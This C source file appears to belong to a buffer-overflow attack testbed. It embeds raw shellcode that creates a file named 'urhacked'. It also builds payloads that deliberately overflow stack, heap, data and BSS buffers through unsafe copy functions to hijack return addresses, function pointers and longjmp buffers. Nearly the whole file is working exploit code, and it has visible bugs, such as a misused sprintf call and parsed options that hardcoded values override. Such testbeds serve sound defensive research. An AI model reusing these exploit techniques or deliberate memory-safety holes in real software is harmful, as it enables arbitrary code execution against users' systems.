#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <setjmp.h>
#include <getopt.h>

#include "attack_generator.h"

/**
 * Shellcode with NOP sled that touches a file 'urhacked'
 * @author Aman Sharma
 *
 */

static char createfile_shellcode[] = 
  "\x17\x05\x00\x00"
  "\x13\x05\xc5\x01"
  "\x93\x05\x10\x24"
  "\x12\x06\x60\x1b"
  "\x93\x06\x00\x00"
  "\x93\x08\x00\x40"
  "\x73\x00\x00\x00"
  "urhacked";

#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

//static size_t size_shellcode_createfile = sizeof(createfile_shellcode) / sizeof(createfile_shellcode[0]) - 1;

const size_t size_createfile_shellcode = sizeof(createfile_shellcode);

ATTACKFORM attack;

CHARPAYLOAD payload;

void fooz() {
  printf("fooz was called\n");
}

struct attackme data_struct = {"AAAAAAAA", &fooz};

struct pointer_struct data_indirect;

struct jmp_struct data_jmp_struct;



int main(int argc, char **argv) {
  int option_char;
//  int i = 0;
  jmp_buf stack_jmp_buffer_param;

  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
  jmp_buf stack_jmp_buffer_param_array[512];
/*
  for(i=0; i < 512; i++){
	if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
		break;
  }
  if (i == 512){
	fprintf(stderr,"Error. Can't allocate appropriate stack_jmp_buffer\n");
	exit(1);
  }
*/

  while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
    switch(option_char) {
    case 't':
      set_technique(optarg);
      break;
    case 'c':
      set_code_ptr(optarg);
      break;
    case 'l':
      set_location(optarg);
      break;
    case 'f':
      set_function(optarg);
      break;
    default:
	fprintf(stderr, "Error: Unknown command option \"%s\"\n", optarg);
      exit(1);
      break;
    }
  }

  /* Check if attack form is possible */
  if(is_attack_possible()) {
    //NN
    perform_attack(&fooz, stack_jmp_buffer_param);
  } else {
	fprintf(stderr, "Error: Attack Impossible\n", optarg);
    //exit(ATTACK_IMPOSSIBLE);
  }
}

char* generate_payload() {

  size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);

  char* temp_char_buffer = (char*) malloc(total_size);

  if(temp_char_buffer == NULL) {
    fprintf(stderr, "malloc failed\n");
  }

  int overflow_ptr = (int) payload.overflow_ptr;
  memcpy(temp_char_buffer, payload.contents, payload.size);

  char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
  memcpy(tc_ra_location, &overflow_ptr, sizeof(int));

  payload.size = total_size;
  return temp_char_buffer;
}

void write_to_buffer(char* temp_char_buffer) {
  char format_string_buf[16];

  switch(attack.function) {
  case MEMCPY:
    memcpy(payload.buffer, temp_char_buffer, payload.size);
    break;
  case STRCPY:
    strcpy(payload.buffer, temp_char_buffer);
    break;
  case STRNCPY:
    strncpy(payload.buffer, temp_char_buffer, payload.size);
    break;
  case SPRINTF:
    sprintf(payload.buffer, "%s", temp_char_buffer);
    break;
  case SNPRINTF:
    sprintf(payload.buffer, payload.size, "%s", temp_char_buffer);
    break;
  case STRCAT:
    strcat(payload.buffer, temp_char_buffer);
    break;
  case STRNCAT:
    strncat(payload.buffer, temp_char_buffer, payload.size);
    break;
  case SSCANF:
    snprintf(format_string_buf, 15, "%%%ic", payload.size);
    sscanf(temp_char_buffer, format_string_buf, payload.buffer);
    break;
  }  
  printf("%c\n", *((char*) payload.buffer));
}

void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param) {  


  char buf[BUFFER_SIZE];

  struct pointer_struct stack_indirect;

  struct jmp_struct stack_jmp_struct;
  int val_struct;
  val_struct = setjmp(stack_jmp_struct.env_buffer);

  struct jmp_struct* heap_jmp_struct = (struct jmp_struct*) malloc(sizeof(struct jmp_struct));
  int val_heap;
  val_heap = setjmp(heap_jmp_struct->env_buffer);

  int val_data;
  val_data = setjmp(data_jmp_struct.env_buffer);

  int val_stack_param;
  val_stack_param = setjmp(stack_jmp_buf_param);

  struct pointer_struct* heap_indirect = (struct pointer_struct*) malloc(sizeof(struct pointer_struct));

  struct attackme stack_struct;
  stack_struct.func_ptr = &fooz;

  struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
  heap_struct->func_ptr = &fooz;

  attack.technique = INDIRECT;
  attack.code_ptr = LONGJMP_BUF_DATA;
  attack.location = STACK;

  payload.size = size_createfile_shellcode;

  static struct attackme bss_struct = {"AAAAAAAA", &fooz};

  static struct pointer_struct bss_indirect = {"AAAAAAA", NULL};

  static struct jmp_struct bss_jmp_struct;

  int vsl_bss = setjmp(bss_jmp_struct.env_buffer);

  // set the buffer to be used
  switch(attack.location) {
    case STACK:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
        payload.overflow_ptr = payload.buffer = stack_struct.buffer;
        payload.target_addr = &stack_struct.func_ptr;
      }
      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_STACK) {
        payload.overflow_ptr = payload.buffer = stack_jmp_struct.buf;
        payload.target_addr = &stack_jmp_struct.env_buffer;
      }
      else if (attack.technique == DIRECT) {
        payload.overflow_ptr = payload.buffer = buf;
        payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      }
      else {
        payload.buffer = stack_indirect.buf;
        payload.target_addr = &stack_indirect.mem_ptr;
      }
      break;

    case HEAP:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
        payload.overflow_ptr = payload.buffer = heap_struct->buffer;
        payload.target_addr = &heap_struct->func_ptr;
      }
      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_HEAP) {
        payload.overflow_ptr = payload.buffer = heap_jmp_struct->buf;
        payload.target_addr = &heap_jmp_struct->env_buffer;
      } 
      else if (attack.technique == DIRECT) {
        payload.overflow_ptr = payload.buffer = malloc(BUFFER_SIZE);
        payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      }
      else {
        payload.buffer = heap_indirect->buf;
        payload.target_addr = &heap_indirect->mem_ptr;
      }
      break;

    case DATA:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
        payload.overflow_ptr = payload.buffer = data_struct.buffer;
        payload.target_addr = &data_struct.func_ptr;
      }
      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_DATA) {
        payload.overflow_ptr = payload.buffer = data_jmp_struct.buf;
        payload.target_addr = &data_jmp_struct.env_buffer;
      }
      else if (attack.technique == INDIRECT) {
        payload.buffer = data_indirect.buf;
        payload.target_addr = &data_indirect.mem_ptr;
      }
      else {
        exit(1);
      }
      payload.overflow_ptr = payload.buffer;
      break;

    case BSS:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
        payload.overflow_ptr = payload.buffer = bss_struct.buffer;
        payload.target_addr = &bss_struct.func_ptr;
      }
      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_BSS) {
        payload.overflow_ptr = payload.buffer = bss_jmp_struct.buf;
        payload.target_addr = &bss_jmp_struct.env_buffer;
      }
      else if (attack.technique == INDIRECT) {
        payload.buffer = bss_indirect.buf;
        payload.target_addr = &bss_indirect.mem_ptr;
      }
      else {
        exit(1);
      }
      payload.overflow_ptr = payload.buffer;
      break;
  }

  // if the attack is indirect, set the overflow_ptr appropriately
  if(attack.technique == INDIRECT) {
    switch(attack.code_ptr) {
      case RET_ADDR:
        payload.overflow_ptr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
        break;
      case STRUCT_FUNC_PTR_STACK:
        payload.overflow_ptr = &stack_struct.func_ptr;
        break;
      case STRUCT_FUNC_PTR_HEAP:
        payload.overflow_ptr = &heap_struct->func_ptr;
        break;
      case STRUCT_FUNC_PTR_DATA:
        payload.overflow_ptr = &data_struct.func_ptr;
        break;
      case STRUCT_FUNC_PTR_BSS:
        payload.overflow_ptr = &bss_struct.func_ptr;
        break;
      case FUNC_PTR_STACK_PARAM:
        payload.overflow_ptr = &stack_func_ptr_param;
        break;
      case LONGJMP_BUF_STACK:
        payload.overflow_ptr = &stack_jmp_struct.env_buffer;
        break;
      case LONGJMP_BUF_HEAP:
        payload.overflow_ptr = &heap_jmp_struct->env_buffer;
        break;
      case LONGJMP_BUF_DATA:
        payload.overflow_ptr = &data_jmp_struct.env_buffer;
        break;
      case LONGJMP_BUF_BSS:
        payload.overflow_ptr = &bss_jmp_struct.env_buffer;
        break;
      case LONGJMP_BUF_STACK_PARAM:
        payload.overflow_ptr = &stack_jmp_buf_param;
   }
  }

  payload.contents = createfile_shellcode;

  char* temp_char_buffer = generate_payload(&fooz);
  write_to_buffer(temp_char_buffer);

  // if the attack is indirect, set the mem_ptr appropriate
  if (attack.technique == INDIRECT && attack.location == STACK) {
    *stack_indirect.mem_ptr = (int) payload.buffer;
    printf("%x\n", *stack_indirect.mem_ptr);
  }


  if (attack.technique == INDIRECT) {
    switch (attack.code_ptr) {
      case STRUCT_FUNC_PTR_STACK:
        stack_struct.func_ptr();
        break;
      case STRUCT_FUNC_PTR_HEAP:
        heap_struct->func_ptr();
        break;
      case STRUCT_FUNC_PTR_DATA:
        data_struct.func_ptr();
        break;
      case STRUCT_FUNC_PTR_BSS:
        bss_struct.func_ptr();
        break;
      case FUNC_PTR_STACK_PARAM:
        stack_func_ptr_param();
        break;
      case LONGJMP_BUF_STACK:
        longjmp(stack_jmp_struct.env_buffer, 7);
        break;
      case LONGJMP_BUF_HEAP:
        longjmp(heap_jmp_struct->env_buffer, 7);
        break;
      case LONGJMP_BUF_DATA:
        longjmp(data_jmp_struct.env_buffer, 7);
        break;
      case LONGJMP_BUF_BSS:
        longjmp(bss_jmp_struct.env_buffer, 7);
        break;
    }
  }

  payload.contents = createfile_shellcode;

  generate_payload(&fooz);
}



boolean is_attack_possible() {
  switch(attack.location) {
    case STACK:
      if((attack.technique == DIRECT) &&
          ((attack.code_ptr == LONGJMP_BUF_HEAP) ||
          (attack.code_ptr == LONGJMP_BUF_BSS) ||
          (attack.code_ptr == LONGJMP_BUF_DATA) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
        fprintf(stderr, "Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
        return FALSE;
      }
      break;
    case HEAP:
      if((attack.technique == DIRECT) &&
          ((attack.code_ptr == RET_ADDR) ||
          (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
          (attack.code_ptr == LONGJMP_BUF_STACK) ||
          (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
          (attack.code_ptr == LONGJMP_BUF_BSS) ||
          (attack.code_ptr == LONGJMP_BUF_DATA) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_BSS)  )) {
        fprintf(stderr, "Error: Impossible perform a direct attack on the heap into another memory segment.\n");
        return FALSE;
      }
      break;
    case BSS:
      if((attack.technique == DIRECT) &&
          ((attack.code_ptr == RET_ADDR) ||
          (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
          (attack.code_ptr == LONGJMP_BUF_STACK) ||
          (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
          (attack.code_ptr == LONGJMP_BUF_HEAP) ||
          (attack.code_ptr == LONGJMP_BUF_DATA) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_HEAP)  )) {
        fprintf(stderr, "Error: Impossible to peform a direct attack in the BSS segment into another memory segment.\n");
        return FALSE;
      }
      break;
    case DATA:
      if((attack.technique == DIRECT) &&
          ((attack.code_ptr == RET_ADDR) ||
          (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
          (attack.code_ptr == LONGJMP_BUF_STACK) ||
          (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
          (attack.code_ptr == LONGJMP_BUF_HEAP) ||
          (attack.code_ptr == LONGJMP_BUF_BSS) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
          (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
        fprintf(stderr, "Error: Impossible to perform a direct attack in the Data segment into another memory segment.\n");
        return FALSE;
      }
      break;
    default:
      fprintf(stderr, "Error: Unknown choice of buffer location\n");
      return FALSE;
  }

  //NN For now only direct attacks to struct_func
  switch (attack.code_ptr){
    case STRUCT_FUNC_PTR_STACK:
    case STRUCT_FUNC_PTR_HEAP:
    case STRUCT_FUNC_PTR_DATA:
    case STRUCT_FUNC_PTR_BSS:
      if(attack.technique != DIRECT){
        fprintf(stderr,"Error: Impossible...for now at least :)\n");
        return FALSE;
      }
      break;
    default:
      break;  
  }

  return TRUE;
}

void set_technique(char *choice) {
  if(strcmp(choice, opt_techniques[0]) == 0) {
    attack.technique = DIRECT;
  } else if(strcmp(choice, opt_techniques[1]) == 0) {
    attack.technique = INDIRECT;
  } else {
    fprintf(stderr, "Error: Unknown choice of technique \"%s\"\n",
	    choice);
  }
}

void set_code_ptr(char *choice) {
  if(strcmp(choice, opt_code_ptrs[0]) == 0) {
    attack.code_ptr = RET_ADDR;
  } else if(strcmp(choice, opt_code_ptrs[3]) == 0) {
    attack.code_ptr = FUNC_PTR_STACK_PARAM;
  } else if(strcmp(choice, opt_code_ptrs[7]) == 0) {
    attack.code_ptr = LONGJMP_BUF_STACK;
  } else if(strcmp(choice, opt_code_ptrs[8]) == 0) {
    attack.code_ptr = LONGJMP_BUF_STACK_PARAM;
  } else if(strcmp(choice, opt_code_ptrs[9]) == 0) {
    attack.code_ptr = LONGJMP_BUF_HEAP;
  } else if(strcmp(choice, opt_code_ptrs[10]) == 0) {
    attack.code_ptr = LONGJMP_BUF_BSS;
  } else if(strcmp(choice, opt_code_ptrs[11]) == 0) {
    attack.code_ptr = LONGJMP_BUF_DATA;
  } else if(strcmp(choice,opt_code_ptrs[12]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_STACK;
  } 
    else if(strcmp(choice,opt_code_ptrs[13]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
  } 
    else if(strcmp(choice,opt_code_ptrs[14]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_DATA;
  } 
    else if(strcmp(choice,opt_code_ptrs[15]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_BSS;
  } 

   else {
      fprintf(stderr, "Error: Unknown choice of code pointer \"%s\"\n",
	      choice);
    exit(1);
  }
}

void set_location(char *choice) {
  if(strcmp(choice, opt_locations[0]) == 0) {
    attack.location = STACK;
  } else if(strcmp(choice, opt_locations[1]) == 0) {
    attack.location = HEAP;
  } else if(strcmp(choice, opt_locations[2]) == 0) {
    attack.location = BSS;
  } else if(strcmp(choice, opt_locations[3]) == 0) {
    attack.location = DATA;
  } else {
      fprintf(stderr, "Error: Unknown choice of memory location \"%s\"\n",
	      choice);
    exit(1);
  }
}

void set_function(char *choice) {
  if(strcmp(choice, opt_funcs[0]) == 0) {
    attack.function = MEMCPY;
  } else if(strcmp(choice, opt_funcs[1]) == 0) {
    attack.function = STRCPY;
  } else if(strcmp(choice, opt_funcs[2]) == 0) {
    attack.function = STRNCPY;
  } else if(strcmp(choice, opt_funcs[3]) == 0) {
    attack.function = SPRINTF;
  } else if(strcmp(choice, opt_funcs[4]) == 0) {
    attack.function = SNPRINTF;
  } else if(strcmp(choice, opt_funcs[5]) == 0) {
    attack.function = STRCAT;
  } else if(strcmp(choice, opt_funcs[6]) == 0) {
    attack.function = STRNCAT;
  } else if(strcmp(choice, opt_funcs[7]) == 0) {
    attack.function = SSCANF; /*
  } else if(strcmp(choice, opt_funcs[8]) == 0) {
    attack.function = FSCANF;
  } else if(strcmp(choice, opt_funcs[9]) == 0) {
    attack.function = HOMEBREW; */
   } else {
      fprintf(stderr, "Error: Unknown choice of vulnerable function \"%s\"\n",
	      choice);
    exit(1);
  }
}
